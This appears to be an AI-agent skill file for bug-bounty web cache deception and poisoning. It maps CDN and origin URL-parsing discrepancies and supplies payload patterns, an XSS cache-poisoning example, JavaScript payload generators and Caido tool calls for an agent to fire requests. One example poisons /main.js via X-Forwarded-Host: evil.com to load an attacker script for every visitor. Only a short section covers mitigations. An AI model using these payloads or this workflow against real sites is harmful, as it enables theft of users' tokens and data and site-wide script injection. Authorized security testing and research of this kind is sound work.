---
name: CacheDeception
version: 1.0.0
last_updated: 2026-01-01
author: xssdoctor
description: Web cache deception and poisoning exploitation. USE WHEN user mentions cache deception, cache poisoning, CDN bypass, URL parsing discrepancy, path confusion, static extension bypass, or cache key manipulation. Based on Martin Doyhenard's "Gotta Cache 'em all" research.
---

# Cache Deception Skill

Expert-level web cache exploitation for bug bounty hunting. Covers URL parsing discrepancies between CDNs and origin servers that enable cache deception (hijack sensitive data) and cache poisoning (store malicious payloads).

## When to Activate

- "cache deception" → Arbitrary Web Cache Deception section
- "cache poisoning" → Arbitrary Web Cache Poisoning section
- "CDN bypass" → URL Discrepancies section
- "path confusion" → Delimiters & Normalization sections
- "static extension" → Static Extensions Exploitation
- "cache key" → Key Normalization section

---

## Core Concepts

### Web Cache Deception
Trick the cache into storing dynamic responses containing sensitive user data. Attacker creates malicious URL, victim clicks it, their authenticated response gets cached, attacker retrieves it.

**Impact:** Token theft, API key leakage, PII exposure, account takeover

### Web Cache Poisoning
Store malicious payloads in cache under legitimate keys. All users requesting that resource receive the poisoned response.

**Impact:** Mass XSS, redirect hijacking, full site defacement

### The Key Insight
CDNs and origin servers parse URLs differently. Exploit these discrepancies to:
1. Make cache think a dynamic response is static (deception)
2. Make cache store response under a different key than intended (poisoning)

---

## URL Discrepancies

### Delimiters

Different servers treat different characters as path delimiters:

| Server/Framework | Delimiter | Example |
|-----------------|-----------|---------|
| **Spring (Java)** | `;` (semicolon) | `/myAccount;var=val` → `/myAccount` |
| **Ruby on Rails** | `.` (dot) | `/myAccount.css` → `/myAccount` (default view) |
| **OpenLiteSpeed** | `%00` (null byte) | `/myAccount%00xxx` → `/myAccount` |
| **Nginx (rewrite)** | `%0a` (newline) | `/myAccount%0axxx` → `/myAccount` |

### CDN Delimiter Behavior

| CDN | Uses `#` as delimiter? | Uses `;` as delimiter? |
|-----|----------------------|----------------------|
| **CloudFlare** | NO | NO |
| **CloudFront** | YES | NO |
| **GCP** | ERROR | NO |
| **Azure** | YES | NO |
| **Imperva** | NO | NO |
| **Fastly** | NO | NO |

### Origin Server Delimiter Behavior

| Server | Uses `#` as delimiter? |
|--------|----------------------|
| **Apache** | ERROR |
| **Nginx** | YES |
| **IIS** | ERROR |
| **Gunicorn** | YES |
| **OpenLiteSpeed** | NO |
| **Puma** | YES |

### Framework Delimiter Behavior

| Framework | Uses `#` as delimiter? |
|-----------|----------------------|
| **Spring** | ERROR |
| **Rails** | YES |
| **Django** | NO |
| **Flask** | YES |
| **Express** | NO |
| **Laravel** | YES |

---

## Normalization Discrepancies

### Path Normalization Table

How `/hello/..%2fworld` is interpreted:

| CDN | Normalized Path |
|-----|-----------------|
| **CloudFlare** | `/hello/..%2Fworld` (no normalization) |
| **CloudFront** | `/world` (normalizes) |
| **GCP** | `/hello/..%2Fworld` (no normalization) |
| **Azure** | `/world` (normalizes) |
| **Imperva** | `/world` (normalizes) |
| **Fastly** | `/hello/..%2Fworld` (no normalization) |

| Origin Server | Normalized Path |
|---------------|-----------------|
| **Apache** | `/hello/..%2Fworld` (no normalization) |
| **Nginx** | `/world` (normalizes) |
| **IIS** | `/world` (normalizes) |
| **Gunicorn** | `/hello/..%2Fworld` (no normalization) |
| **OpenLiteSpeed** | `/world` (normalizes) |
| **Puma** | `/hello/..%2Fworld` (no normalization) |

### Exploitable Combinations

**Cache doesn't normalize, origin does:**
- CloudFlare + Nginx/IIS/OpenLiteSpeed
- GCP + Nginx/IIS/OpenLiteSpeed
- Fastly + Nginx/IIS/OpenLiteSpeed

**Cache normalizes, origin doesn't:**
- CloudFront + Apache/Gunicorn/Puma
- Azure + Apache/Gunicorn/Puma
- Imperva + Apache/Gunicorn/Puma

---

## Arbitrary Web Cache Deception

### Technique 1: Static Extensions

**Requirement:** Origin uses delimiter that cache doesn't recognize

**Payload Pattern:**
```
/<dynamic_endpoint><delimiter><random>.css
```

**Examples:**
```
# Semicolon delimiter (Spring)
/myAccount;foo.css
/api/user;x.js
/settings;a.png

# Encoded hash (decoded by origin)
/myAccount%23foo.css
/api/profile%23x.js

# Null byte (OpenLiteSpeed)
/myAccount%00foo.css

# Newline (Nginx rewrite)
/myAccount%0afoo.css
```

**Flow:**
```
Browser → Cache (sees /myAccount;foo.css → static) → Origin (sees /myAccount)
                    ↓ CACHED
         Attacker retrieves /myAccount;foo.css → gets victim's data
```

**Static extensions commonly cached:**
```
.js .css .png .jpg .jpeg .gif .ico .svg .woff .woff2
.ttf .eot .otf .pdf .zip .gz .tar .mp4 .mp3 .webp
```

### Technique 2: Static Directories

**Requirement:** Cache normalizes path, origin uses delimiter

**Payload Pattern:**
```
/<dynamic_endpoint><delimiter>/..%2F<static_directory>/any
```

**Examples:**
```
# With delimiter + path traversal (Azure, CloudFront, Imperva)
/myAccount$/..%2Fstatic/x
/api/user;/..%2Fassets/y
/settings#/..%2Fwp-content/z

# Without delimiter, just traversal (origin normalizes, cache doesn't)
/static/..%2FmyAccount
/assets/..%2Fapi/user
/wp-content/..%2Fsettings
```

**Common static directories:**
```
/static
/assets
/wp-content
/media
/templates
/public
/shared
/dist
/build
/resources
```

### Technique 3: Static Files

**Payload Pattern:**
```
/<dynamic_endpoint><delimiter>/..%2F<static_file>
```

**Examples:**
```
/myAccount$/..%2Frobots.txt
/api/user;/..%2Ffavicon.ico
/settings#/..%2Findex.html
```

**Static files commonly cached:**
```
/robots.txt
/favicon.ico
/index.html
/sitemap.xml
/.well-known/*
```

### Technique 4: IIS Backslash

**IIS converts `%5C` to `\` which it treats as `/`**

```
# Cache sees /static/..%5CmyAccount
# IIS sees /static/..\myAccount → /myAccount

/static/..%5CmyAccount
/assets/..%5Capi/user
```

---

## Arbitrary Web Cache Poisoning

### Technique 1: Key Normalization Exploitation

**Requirement:** Cache normalizes key before storing

**Scenario:** Self-reflected XSS in path, but path contains the payload so no one visits it.

**Payload Pattern:**
```
/<xss_payload>/../../<target_path>
```

**Example:**
```
# Original XSS (unexploitable alone):
GET /<script>alert(1)</script> → 404 with reflected path

# With path traversal to control key:
GET /<script>alert(1)</script>/../../home
    Cache key: /home
    Origin response: XSS payload reflected

# All users visiting /home now get XSS
```

### Technique 2: Backend Delimiter Exploitation

**Requirement:** Origin uses delimiter cache doesn't recognize, cache normalizes key

**Payload Pattern:**
```
/<poisoned_response_path><delimiter>/../<target_cache_key>
```

**Example:**
```
GET /payload$/../home
    Cache key: /home (after normalization)
    Origin path: /payload (delimiter truncates)

# If /payload returns cacheable response with attacker-controlled content:
# All users visiting /home get poisoned response
```

### Technique 3: Frontend Delimiter Exploitation

**Requirement:** Cache uses delimiter origin doesn't, cache normalizes key

**Payload Pattern:**
```
/<target_cache_key><frontend_delimiter>/../<poisoned_response_path>
```

**Example (Azure with `#`):**
```
GET /home#/../payload
    Cache key: /home (# is delimiter, then normalized)
    Origin path: /payload (# forwarded, origin doesn't treat as delimiter)

# Poison /home with content from /payload
```

### Cache-What-Where: Weaponizing "Unexploitable" Bugs

Combine cache poisoning with vulnerabilities that require specific headers or can't be triggered via browser:

**Example: Open Redirect via X-Forwarded-Host**
```http
GET /home HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 302 Found
Location: http://evil.com/index.html
```

**Weaponize with cache key confusion:**
```
GET /main.js#/../home HTTP/1.1
X-Forwarded-Host: evil.com

# Cache stores redirect under /main.js key
# Homepage loads /main.js → redirected to attacker's script
# Full site takeover via malicious JS
```

---

## Detection Methodology

### Detecting Origin Delimiters

1. Find non-cacheable endpoint (POST, or `Cache-Control: no-store`)
2. Send request to `/endpoint` → Response R0
3. Send request to `/endpointABCD` → Response R1 (should differ)
4. Send request to `/endpoint<char>ABCD` → Response R2
5. If R2 == R0, `<char>` is a delimiter

**Test characters:**
```
; # $ % & ' ( ) * + , - . / : < = > ? @ [ \ ] ^ _ ` { | } ~
%00 %0a %0d %23 %3b %3f
```

### Detecting Cache Delimiters

1. Find cacheable endpoint with `X-Cache: hit`
2. Send request to `/static<char><random>`
3. If response matches cached `/static`, `<char>` is delimiter

### Detecting Normalization

**Origin normalization:**
```
GET /home?cb=123
GET /xxx/../home?cb=123

# If responses identical (and not cached), origin normalizes
```

**Cache normalization:**
```
GET /static/file.js
GET /xxx/../static/file.js

# If second has X-Cache: hit, cache normalizes key
```

**Encoded traversal:**
```
GET /hello/..%2fworld
# Compare with /world to detect encoded normalization
```

---

## Caido MCP Integration

### Finding Cache Deception Targets

```bash
# Find responses with caching headers
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"Cache-Control\" AND resp.raw.cont:\"public\""

# Find responses with X-Cache headers
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"X-Cache\""

# Find dynamic endpoints with sensitive data
mcp__caido__list_by_httpql:
  httpql: "req.path.cont:\"/api/\" AND resp.raw.cont:\"token\""

# Find account/profile endpoints
mcp__caido__list_by_httpql:
  httpql: "req.path.cont:\"/account\" OR req.path.cont:\"/profile\" OR req.path.cont:\"/user\""
```

### Identifying CDN/Technology Stack

```bash
# CloudFlare detection
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"cf-ray\" OR resp.raw.cont:\"cloudflare\""

# CloudFront detection
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"x-amz-cf\" OR resp.raw.cont:\"cloudfront\""

# Akamai detection
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"x-akamai\" OR resp.raw.cont:\"akamai\""

# Fastly detection
mcp__caido__list_by_httpql:
  httpql: "resp.raw.cont:\"x-served-by\" AND resp.raw.cont:\"cache-\""
```

### Testing Cache Behavior

```bash
# Send test request to replay
mcp__caido__send_to_replay:
  request_ids: ["target-request-id"]
  collection_name: "Cache Deception Testing"

# Test with delimiter payload
mcp__caido__start_replay_task:
  session_id: "session-id"
  raw_request: |
    GET /api/user;test.css HTTP/1.1
    Host: target.com
    Cookie: session=victim_token
```

### Testing Delimiter Behavior

```bash
# Test semicolon delimiter
mcp__caido__sendRequest:
  url: "https://target.com"
  method: "GET"
  path: "/endpoint;test"

# Test encoded characters
mcp__caido__sendRequest:
  url: "https://target.com"
  method: "GET"
  path: "/endpoint%23test"

# Test path traversal normalization
mcp__caido__sendRequest:
  url: "https://target.com"
  method: "GET"
  path: "/xxx/../endpoint"
```

### Logging Cache Deception Findings

```bash
mcp__caido__create_findings_from_requests:
  title: "Web Cache Deception via [delimiter/technique]"
  description: |
    Cache deception allows hijacking authenticated responses.

    Technique: [Static extension / Static directory / Normalization]
    Delimiter: [character]
    CDN: [identified CDN]

    PoC URL: /sensitive-endpoint[delimiter]random.css

    Impact: Attacker can retrieve victim's authenticated data including
    tokens, PII, and session information.
  severity: "high"
  request_id: "vulnerable-request-id"
  tags: ["cache-deception", "account-takeover"]
```

---

## Payload Generator

### Static Extension Payloads

```javascript
function generateStaticExtensionPayloads(endpoint) {
  const delimiters = [';', '%23', '%3f', '%00', '%0a', '$', '#'];
  const extensions = ['.css', '.js', '.png', '.ico', '.svg', '.woff'];
  const payloads = [];

  for (const d of delimiters) {
    for (const ext of extensions) {
      payloads.push(`${endpoint}${d}${Math.random().toString(36).slice(2)}${ext}`);
    }
  }
  return payloads;
}

// Example: generateStaticExtensionPayloads('/api/user')
```

### Static Directory Payloads

```javascript
function generateStaticDirPayloads(endpoint) {
  const delimiters = [';', '%23', '$', ''];
  const dirs = ['/static/', '/assets/', '/wp-content/', '/media/'];
  const traversals = ['/..%2f', '/..%5c', '/../'];
  const payloads = [];

  for (const d of delimiters) {
    for (const dir of dirs) {
      for (const t of traversals) {
        // Delimiter + traversal + dir (cache normalizes)
        payloads.push(`${endpoint}${d}${t}${dir}x`);
        // Dir + traversal + endpoint (origin normalizes)
        payloads.push(`${dir}..%2f${endpoint.slice(1)}`);
      }
    }
  }
  return payloads;
}
```

### Cache Poisoning Payloads

```javascript
function generatePoisoningPayloads(targetKey, payloadPath) {
  const payloads = [];

  // Backend delimiter exploitation
  const backendDelimiters = [';', '%00', '%0a', '$'];
  for (const d of backendDelimiters) {
    payloads.push(`${payloadPath}${d}/../${targetKey}`);
  }

  // Frontend delimiter exploitation
  const frontendDelimiters = ['#', '%23'];
  for (const d of frontendDelimiters) {
    payloads.push(`${targetKey}${d}/../${payloadPath}`);
  }

  // Key normalization exploitation
  payloads.push(`${payloadPath}/../../${targetKey}`);

  return payloads;
}
```

---

## Testing Workflow

### Phase 1: Reconnaissance

1. **Identify CDN** via response headers
2. **Find sensitive endpoints** (account, profile, API with tokens)
3. **Check cache headers** (X-Cache, Cache-Control, Age, Vary)
4. **Map static resources** (directories, extensions cached)

### Phase 2: Delimiter Discovery

1. **Test origin delimiters** on non-cacheable endpoint
2. **Test cache delimiters** on static resource
3. **Document discrepancies** between cache and origin

### Phase 3: Normalization Discovery

1. **Test origin normalization** with path traversal
2. **Test cache key normalization** via cache hit analysis
3. **Test encoded traversal** (`..%2f`, `..%5c`)

### Phase 4: Exploitation

**For Cache Deception:**
1. Craft URL: `/<sensitive_endpoint><delimiter><static_trigger>`
2. Send as victim (authenticated)
3. Verify response cached (X-Cache: hit on repeat)
4. Retrieve as attacker (unauthenticated)
5. Confirm sensitive data in response

**For Cache Poisoning:**
1. Identify cacheable response with controllable content
2. Craft URL that maps payload to target key
3. Send poisoning request
4. Verify target URL serves poisoned content

### Phase 5: Impact Demonstration

- Extract tokens/API keys from deception
- Demonstrate XSS/redirect from poisoning
- Calculate affected user scope (cache TTL × traffic)

---

## Common Vulnerable Combinations

| CDN | Origin | Technique | Payload Example |
|-----|--------|-----------|-----------------|
| CloudFlare | Spring | Semicolon delimiter | `/user;x.css` |
| CloudFlare | Rails | Dot delimiter | `/user.css` (returns HTML) |
| CloudFlare | Nginx | Path normalization | `/static/..%2fuser` |
| CloudFront | Any | Hash delimiter | `/target#/../payload` |
| Azure | Any | Hash + normalization | `/target#/../payload` |
| Any | OpenLiteSpeed | Null byte | `/user%00x.css` |
| Any | IIS | Backslash | `/static/..%5cuser` |

---

## Defence Notes (For Reports)

**Mitigations:**
1. Mark dynamic responses with `Cache-Control: no-store, private`
2. Ensure cache rules don't override Cache-Control
3. Avoid URL normalization differences between cache and origin
4. Don't forward characters after cache delimiters to origin
5. Use same URL parser configuration across stack

---

## Related Skills

| Skill | When to Use |
|-------|-------------|
| **CSPT** | Chain path traversal with cache deception for stored XSS |
| **ClientSideAttacks** | Escalate cache poisoning to XSS |
| **VulnChaining** | Combine cache deception with other bugs for ATO |
| **BugBountyWorkflow** | Structure testing and reporting |

**Common Chains:**
- Cache Deception + Token in Response → Account Takeover
- Cache Poisoning + Open Redirect → Mass XSS via script load
- CSPT + Cache Deception → Store attacker content, cache victim retrieval
- Cache Poisoning + Self-XSS → Turn unexploitable XSS into stored XSS

---

## References

- Martin Doyhenard - "Gotta Cache 'em all" (PortSwigger)
- Omer Gil - "Web Cache Deception Attack" (BlackHat 2017)
- James Kettle - "Practical Web Cache Poisoning" (PortSwigger)
- James Kettle - "Web Cache Entanglement" (PortSwigger)

---

**This skill provides attack patterns for xssdoctor's cache exploitation research. All testing must be authorized.**
